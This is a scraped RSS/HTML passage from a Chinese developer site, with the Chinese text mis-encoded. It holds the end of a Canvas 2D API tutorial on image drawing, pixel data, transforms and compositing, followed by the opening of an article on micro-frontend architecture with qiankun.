<span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.src</span> = 'image<span class="hljs-selector-class">.jpg</span>';

<span class="hljs-comment">// åŸºæœ¬ç»˜åˆ¶</span>
ctx<span class="hljs-selector-class">.drawImage</span>(img, dx, dy);

<span class="hljs-comment">// ç¼©æ”¾ç»˜åˆ¶</span>
ctx<span class="hljs-selector-class">.drawImage</span>(img, dx, dy, dWidth, dHeight);

<span class="hljs-comment">// åˆ‡ç‰‡ç»˜åˆ¶</span>
ctx<span class="hljs-selector-class">.drawImage</span>(img, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight);
<span class="hljs-comment">// sx,sy: æºå›¾åƒèµ·å§‹åæ ‡</span>
<span class="hljs-comment">// sWidth,sHeight: æºå›¾åƒè£åˆ‡å°ºå¯¸</span>
<span class="hljs-comment">// dx,dy: ç›®æ ‡ä½ç½®</span>
<span class="hljs-comment">// dWidth,dHeight: ç›®æ ‡å°ºå¯¸</span>
</code></pre>
<h3 data-id="heading-17">2. å›¾åƒæ•°æ®æ“ä½œ</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">// è·å–å›¾åƒæ•°æ®
const <span class="hljs-attr">imageData</span> = ctx.getImageData(sx, sy, sw, sh)<span class="hljs-comment">;</span>
// imageData.data: Uint8ClampedArray <span class="hljs-section">[R,G,B,A,R,G,B,A,...]</span>

// æ”¾ç½®å›¾åƒæ•°æ®
ctx.putImageData(imageData, dx, dy)<span class="hljs-comment">;</span>

// åˆ›å»ºç©ºç™½å›¾åƒæ•°æ®
const <span class="hljs-attr">newImageData</span> = ctx.createImageData(width, height)<span class="hljs-comment">;</span>
const <span class="hljs-attr">newImageData2</span> = ctx.createImageData(imageData)<span class="hljs-comment">;  // ç›¸åŒå°ºå¯¸</span>
</code></pre>
<h2 data-id="heading-18">å…­ã€å˜å½¢ä¸åˆæˆAPI</h2>
<h3 data-id="heading-19">1. åæ ‡å˜æ¢</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// å¹³ç§»</span>
ctx<span class="hljs-selector-class">.translate</span>(x, y);

<span class="hljs-comment">// æ—‹è½¬ï¼ˆå¼§åº¦ï¼‰</span>
ctx<span class="hljs-selector-class">.rotate</span>(angle);

<span class="hljs-comment">// ç¼©æ”¾</span>
ctx<span class="hljs-selector-class">.scale</span>(x, y);

<span class="hljs-comment">// å˜æ¢çŸ©é˜µ</span>
ctx<span class="hljs-selector-class">.transform</span>(a, b, c, d, e, f);
<span class="hljs-comment">// a: æ°´å¹³ç¼©æ”¾  b: æ°´å¹³å€¾æ–œ</span>
<span class="hljs-comment">// c: å‚ç›´å€¾æ–œ  d: å‚ç›´ç¼©æ”¾</span>
<span class="hljs-comment">// e: æ°´å¹³ç§»åŠ¨  f: å‚ç›´ç§»åŠ¨</span>

<span class="hljs-comment">// è®¾ç½®å˜æ¢çŸ©é˜µ</span>
ctx<span class="hljs-selector-class">.setTransform</span>(a, b, c, d, e, f);

<span class="hljs-comment">// é‡ç½®å˜æ¢</span>
ctx<span class="hljs-selector-class">.resetTransform</span>();
</code></pre>
<h3 data-id="heading-20">2. çŠ¶æ€ä¿å­˜ä¸æ¢å¤</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ä¿å­˜å½“å‰çŠ¶æ€ï¼ˆæ ·å¼ã€å˜å½¢ç­‰ï¼‰</span>
ctx<span class="hljs-selector-class">.save</span>();

<span class="hljs-comment">// æ¢å¤ä¸Šæ¬¡ä¿å­˜çš„çŠ¶æ€</span>
ctx<span class="hljs-selector-class">.restore</span>();
</code></pre>
<h3 data-id="heading-21">3. åˆæˆä¸è£å‰ª</h3>
<p>javascript</p>
<pre><code class="hljs language-perl" lang="perl">// å…¨å±€åˆæˆæ“ä½œ
ctx.globalCompositeOperation = <span class="hljs-string">'source-over'</span>;
<span class="hljs-regexp">//</span> å¸¸ç”¨å€¼: <span class="hljs-string">'source-over'</span>, <span class="hljs-string">'source-in'</span>, <span class="hljs-string">'source-out'</span>, 
<span class="hljs-regexp">//</span> <span class="hljs-string">'destination-over'</span>, <span class="hljs-string">'destination-in'</span>, <span class="hljs-string">'destination-out'</span>,
<span class="hljs-regexp">//</span> <span class="hljs-string">'lighter'</span>, <span class="hljs-string">'copy'</span>, <span class="hljs-string">'xor'</span>, <span class="hljs-string">'multiply'</span>, <span class="hljs-string">'screen'</span>, <span class="hljs-string">'overlay'</span>,
<span class="hljs-regexp">//</span> <span class="hljs-string">'darken'</span>, <span class="hljs-string">'lighten'</span>, <span class="hljs-string">'color-dodge'</span>, <span class="hljs-string">'color-burn'</span>, 
<span class="hljs-regexp">//</span> <span class="hljs-string">'hard-light'</span>, <span class="hljs-string">'soft-light'</span>, <span class="hljs-string">'difference'</span>, <span class="hljs-string">'exclusion'</span>,
<span class="hljs-regexp">//</span> <span class="hljs-string">'hue'</span>, <span class="hljs-string">'saturation'</span>, <span class="hljs-string">'color'</span>, <span class="hljs-string">'luminosity'</span>

// åˆ›å»ºè£å‰ªåŒºåŸŸ
ctx.clip();  <span class="hljs-regexp">//</span> åŸºäºå½“å‰è·¯å¾„åˆ›å»ºè£å‰ªåŒºåŸŸ

// åˆ¤æ–­ç‚¹æ˜¯å¦åœ¨è£å‰ªåŒºåŸŸå†…
const isInClip = ctx.isPointInStroke(<span class="hljs-keyword">x</span>, <span class="hljs-keyword">y</span>);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¾®å‰ç«¯ï¼šä»â€œå¤§å‰ç«¯â€åˆ°â€œç§¯æœ¨å¼å¼€å‘â€çš„æ¶æ„æ¼”è¿›]]></title>    <link>https://juejin.cn/post/7581727073582121011</link>    <guid>https://juejin.cn/post/7581727073582121011</guid>    <pubDate>2025-12-10T02:52:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073582121011" data-draft-id="7581698635866636314" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¾®å‰ç«¯ï¼šä»â€œå¤§å‰ç«¯â€åˆ°â€œç§¯æœ¨å¼å¼€å‘â€çš„æ¶æ„æ¼”è¿›"/> <meta itemprop="keywords" content="å‰ç«¯,æ¶æ„,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2025-12-10T02:52:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‰‘æ£±è›¾å­"/> <meta itemprop="url" content="https://juejin.cn/user/2823201593493790"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¾®å‰ç«¯ï¼šä»â€œå¤§å‰ç«¯â€åˆ°â€œç§¯æœ¨å¼å¼€å‘â€çš„æ¶æ„æ¼”è¿›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2823201593493790/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‰‘æ£±è›¾å­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:52:39.000Z" title="Wed Dec 10 2025 02:52:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>è®°å¾—é‚£äº›å¹´æˆ‘ä»¬ç»´æŠ¤çš„â€œå·¨çŸ³åº”ç”¨â€å—ï¼Ÿä¸€ä¸ª<code>package.json</code>é‡Œå¡æ»¡äº†å‡ ç™¾ä¸ªä¾èµ–ï¼Œæ¯æ¬¡<code>npm install</code>éƒ½åƒæ˜¯ä¸€åœºèµŒåšï¼›å›¢é˜Ÿåä½œæ—¶ï¼Œ<code>git merge</code>å†²çªè§£å†³åˆ°æ€€ç–‘äººç”Ÿï¼›æŠ€æœ¯æ ˆå‡çº§ï¼Ÿé‚£æ„å‘³ç€â€œå…¨ç›˜æ¨ç¿»é‡æ¥â€â€¦â€¦</p>
<p>éšç€å‰ç«¯å¤æ‚åº¦çš„çˆ†ç‚¸å¼å¢é•¿ï¼Œä¼ ç»Ÿå•ä½“æ¶æ„å·²ä¸å ªé‡è´Ÿã€‚è€Œ<strong>å¾®å‰ç«¯</strong>ï¼Œæ­£æ˜¯ä¸ºäº†è§£å†³è¿™äº›ç—›ç‚¹è€Œç”Ÿçš„ä¸€ç§æ¶æ„èŒƒå¼ã€‚æœ¬æ–‡å°†ä»¥<code>qiankun</code>ä¸ºåˆ‡å…¥ç‚¹ï¼Œå­¦ä¹ ä¸€ä¸‹å¾®å‰ç«¯çš„æ¨¡å¼ã€‚</p>
<h2 data-id="heading-0">åŸºç¡€æ¦‚å¿µ</h2>
<h3 data-id="heading-1">å¾®å‰ç«¯æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>å¾®å‰ç«¯ä¸æ˜¯æ¡†æ¶ï¼Œè€Œæ˜¯ä¸€ç§æ¶æ„ç†å¿µ</strong>
â€”â€”å°†å¤§å‹å‰ç«¯åº”ç”¨æ‹†åˆ†ä¸ºå¤šä¸ª<strong>ç‹¬ç«‹å¼€å‘ã€ç‹¬ç«‹éƒ¨ç½²ã€æŠ€æœ¯æ ˆæ— å…³</strong>çš„å°å‹åº”ç”¨ï¼Œå†å°†å…¶ç»„åˆä¸ºä¸€ä¸ªå®Œæ•´çš„åº”ç”¨ã€‚</p>
<p>ä¸€å¥è¯ï¼Œå®ƒè®©å‰ç«¯å¼€å‘ä»â€œé€ å¤§æ¥¼â€å˜æˆäº† <strong>â€œæ­ä¹é«˜â€</strong> ã€‚</p>
<h3 data-id="heading-2">ä¸ºä»€ä¹ˆéœ€è¦å¾®å‰ç«¯ï¼Ÿ</h3>
<p><strong>ç—›ç‚¹çœŸå®å­˜åœ¨ï¼š</strong></p>
<ul>
<li>ğŸŒÂ <strong>å¼€å‘æ•ˆç‡ä½ä¸‹</strong>ï¼šå‡ ç™¾äººç»´æŠ¤ä¸€ä¸ªä»“åº“ï¼Œæ¯æ¬¡ä¸Šçº¿éƒ½éœ€å…¨é‡å›å½’</li>
<li>ğŸ”’Â <strong>æŠ€æœ¯æ ˆé”å®š</strong>ï¼šä¸‰å¹´å‰é€‰çš„æ¡†æ¶ï¼Œç°åœ¨æƒ³å‡çº§ï¼Ÿä»£ä»·å·¨å¤§</li>
<li>ğŸ‘¥Â <strong>å›¢é˜Ÿåä½œå›°éš¾</strong>ï¼šåŠŸèƒ½è¾¹ç•Œæ¨¡ç³Šï¼Œä»£ç ç›¸äº’æ¸—é€</li>
<li>ğŸš¢Â <strong>éƒ¨ç½²é£é™©é«˜</strong>ï¼šä¸€ä¸ªå°æ”¹åŠ¨ï¼Œå¯èƒ½å¯¼è‡´æ•´ä¸ªç³»ç»Ÿå´©æºƒ</li>
</ul>
<p><strong>å¾®å‰ç«¯å¸¦æ¥çš„æ”¹å˜ï¼š</strong></p>
<ul>
<li>âœ…Â <strong>ç‹¬ç«‹è‡ªæ²»</strong>ï¼šæ¯ä¸ªå›¢é˜Ÿè´Ÿè´£è‡ªå·±çš„â€œå¾®åº”ç”¨â€ï¼Œä»å¼€å‘åˆ°éƒ¨ç½²å…¨æµç¨‹è‡ªä¸»</li>
<li>âœ…Â <strong>æŠ€æœ¯æ ˆè‡ªç”±</strong>ï¼šReactã€Vueã€Angularã€ç”šè‡³jQueryï¼Œå’Œå¹³å…±å¤„</li>
<li>âœ…Â <strong>å¢é‡å‡çº§</strong>ï¼šè€ç³»ç»Ÿå¯ä»¥ä¸€ç‚¹ç‚¹æ›¿æ¢ï¼Œè€Œä¸æ˜¯â€œä¸€å¤œé‡æ„â€</li>
<li>âœ…Â <strong>å®¹é”™éš”ç¦»</strong>ï¼šä¸€ä¸ªå­åº”ç”¨å´©æºƒï¼Œä¸å½±å“å…¶ä»–åŠŸèƒ½</li>
</ul>
<h3 data-id="heading-3">å¾®å‰ç«¯çš„æ ¸å¿ƒæ€æƒ³ï¼š</h3>
<ul>
<li>æ‹†åˆ†ï¼šå°†å¤§å‹å‰ç«¯åº”ç”¨æ‹†åˆ†ä¸ºå¤šä¸ªç‹¬ç«‹çš„å°å‹åº”ç”¨ã€‚</li>
<li>é›†æˆï¼šé€šè¿‡æŸç§æ–¹å¼å°†è¿™äº›å°å‹åº”ç”¨é›†æˆåœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªæ•´ä½“ã€‚</li>
<li>è‡ªæ²»ï¼šæ¯ä¸ªå°å‹åº”ç”¨éƒ½å¯ä»¥ç‹¬ç«‹å¼€å‘ã€æµ‹è¯•ã€éƒ¨ç½²ã€‚</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¾®å‰ç«¯æ¶æ„</span>
â”œâ”€â”€ container/      <span class="hljs-comment">// ä¸»åº”ç”¨ï¼ˆåŸºåº§ï¼‰</span>
â”œâ”€â”€ app-react/      <span class="hljs-comment">// Reactå­åº”ç”¨ï¼ˆå›¢é˜ŸAï¼‰</span>
â”œâ”€â”€ app-vue/        <span class="hljs-comment">// Vueå­åº”ç”¨ï¼ˆå›¢é˜ŸBï¼‰</span>
â”œâ”€â”€ app-angular/    <span class="hljs-comment">// Angularå­åº”ç”¨ï¼ˆå›¢é˜ŸCï¼‰</span>
â””â”€â”€ app-legacy/     <span class="hljs-comment">// è€ç³»ç»Ÿï¼ˆjQueryï¼‰</span>

<span class="hljs-comment">// ä¼˜åŠ¿ï¼š</span>
<span class="hljs-comment">// 1. âœ… æŠ€æœ¯æ ˆæ— å…³</span>
<span class="hljs-comment">// 2. âœ… ç‹¬ç«‹å¼€å‘ã€ç‹¬ç«‹éƒ¨ç½²</span>
<span class="hljs-comment">// 3. âœ… å¢é‡æ›´æ–°</span>
<span class="hljs-comment">// 4. âœ… å®¹é”™æ€§é«˜ï¼ˆä¸€ä¸ªå­åº”ç”¨æŒ‚äº†ä¸å½±å“å…¶ä»–ï¼‰</span>
</code></pre>
<h3 data-id="heading-4">åº”ç”¨åœºæ™¯</h3>
<p>æ¸è¿›å¼é‡æ„ï¼šå¯¹äºä¸€ä¸ªè€é¡¹ç›®ä¸€ç‚¹ç‚¹è¿›è¡Œæ¶æ„çš„å‡çº§</p>
<pre><code class="hljs">è€ç³»ç»Ÿï¼ˆjQuery + PHPï¼‰ â†’ é€æ­¥æ›¿æ¢ä¸ºç°ä»£æ¡†æ¶
   â†“
ä¿ç•™æ ¸å¿ƒä¸šåŠ¡æ¨¡å— + é€æ­¥æ·»åŠ React/Vueæ–°æ¨¡å—
</code></pre>
<p>å¤šå›¢é˜Ÿåä½œï¼šä¸åŒéƒ¨é—¨äººå‘˜ä¹‹é—´æŠ€æœ¯æ ˆå­˜åœ¨å·®å¼‚ï¼Œéœ€è¦å•ç‹¬å¼€å‘</p>
